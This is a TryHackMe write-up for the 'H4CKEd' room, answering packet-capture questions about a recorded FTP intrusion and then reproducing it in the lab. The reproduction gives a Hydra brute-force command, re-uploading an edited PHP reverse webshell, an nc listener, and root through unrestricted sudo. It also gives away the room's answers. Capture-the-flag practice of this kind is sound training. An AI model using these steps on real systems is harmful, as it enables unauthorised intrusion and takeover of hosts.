# H4CKEd — TryHackMe Writeup


<img width="1906" height="369" alt="Screenshot 2025-11-15 164901" src="https://github.com/user-attachments/assets/93257e65-b8da-4072-ac3a-7d3f3a35361c" />



H4CKEd is a straightforward forensic + exploitation challenge built around a recorded attack. Task 1 revolves entirely around analyzing a packet capture and extracting the attacker’s actions. Task 2 recreates the compromise. Nothing fancy, but a good warm-up box.

---

# Task 1 — PCAP Analysis

Task 1 is trivial if you load the capture into Wireshark and follow the suspicious FTP traffic. Everything the attacker does is visible in plaintext. You can answer it too by yourself just lil enumeration.

Answers:

* **What service is the attacker logging into?**
  FTP

* **What tool by Van Hauser can brute force multiple services?**
  Hydra

* **What username is the attacker trying?**
  jenny

* **What is the password?**
  password123

* **What is the working directory after login?**
  `/var/www/html`

* **What file did the attacker upload?**
  `shell.php`

* **What is the backdoor’s full URL?**
  `http://pentestmonkey.net/tools/php-reverse-shell`

* **What command did the attacker run after getting a shell?**
  `whoami`

* **What’s the hostname?**
  `wir3`

* **What command was used to spawn a proper TTY?**
  `python3 -c 'import pty; pty.spawn("/bin/bash")'`

* **What command was used to gain root?**
  `sudo su`

* **What GitHub project was downloaded?**
  Reptile

* **What type of malware is Reptile?**
  rootkit

That wraps up the forensic portion. Task 2 is where we reproduce the compromise.

---

# Task 2 — Replicating the Attack

The challenge description gives away the intended path: 



<img width="1606" height="747" alt="Screenshot 2025-11-15 170252" src="https://github.com/user-attachments/assets/89bf4a3c-72ba-4c2e-8116-d04deb61d2e7" />



we just have to fuzz passsword for jenny's ftp service, then we have to login then there must be something (probably shell.php uploaded by hacker) we have to edit it and move it to our machine and get reverse shell. and then finally prevesc for root and challenge solved..  lets do this practically

## 1. Brute forcing Jenny’s FTP password

Hydra handles this easily:

```
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<TARGET-IP>
```

A few minutes later, Hydra returns the valid password.


<img width="963" height="170" alt="Screenshot 2025-11-15 154907" src="https://github.com/user-attachments/assets/162342da-0347-41cf-ae10-0eebb6632cb8" />



## 2. FTP access

With working creds, log in:

```
ftp <TARGET-IP>
```

Inside `/var/www/html` sits the attacker’s uploaded `shell.php`.


<img width="548" height="378" alt="Screenshot 2025-11-15 170754" src="https://github.com/user-attachments/assets/ca6046ec-b775-48ec-b7ec-530d34d50e95" />



Download it and edit the reverse-shell IP and port.


<img width="643" height="117" alt="Screenshot 2025-11-15 163729" src="https://github.com/user-attachments/assets/1083c19e-33bf-4aa1-9f99-140d69b4cb52" />


now upload it back :


<img width="569" height="252" alt="Screenshot 2025-11-15 170849" src="https://github.com/user-attachments/assets/7aaf6fc0-9b2f-4131-af89-077a5e37759b" />



Example flow:

```
get shell.php
# edit LHOST and LPORT
put shell.php
```

## 3. Trigger the webshell

Set up a listener:

```
nc -lvnp 4444
```

Then hit the payload in the browser:

```
http://<TARGET-IP>/shell.php
```

<img width="799" height="289" alt="Screenshot 2025-11-15 163847" src="https://github.com/user-attachments/assets/b7f631a3-f5cb-402e-aa82-be7d24a026ca" />


As soon as the page loads, the listener catches a shell as `www-data`.


<img width="948" height="316" alt="Screenshot 2025-11-15 163855" src="https://github.com/user-attachments/assets/651956c5-b0b6-46b9-88bf-b5aa9aa4ce6b" />



## 4. Switching to Jenny

Since we already have Jenny’s password, reuse it for a proper user shell:

```
su jenny
```

Upgrade the TTY for sanity:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


<img width="931" height="667" alt="Screenshot 2025-11-15 164809" src="https://github.com/user-attachments/assets/2f8a65fa-6e49-474c-b063-1def43906f9b" />



## 5. Privilege Escalation

Checking Jenny’s sudo rights:

```
sudo -l
```


<img width="763" height="163" alt="Screenshot 2025-11-15 164747" src="https://github.com/user-attachments/assets/7339e7b7-9c7f-4135-9dc0-a44ad44128ab" />



Damnn Jenny can run everything as root. No trick required — classic misconfiguration.

Gain root:

```
sudo su
```


At this point the box is fully compromised. The root flag sits exactly where expected.


<img width="462" height="286" alt="Screenshot 2025-11-15 164725" src="https://github.com/user-attachments/assets/5691fffb-31b7-48fc-823e-0778b4994a40" />

---

Task 1 questions are recommended to solve before direct attack as its providing everything.
CHALLENGE SOLVED !! 
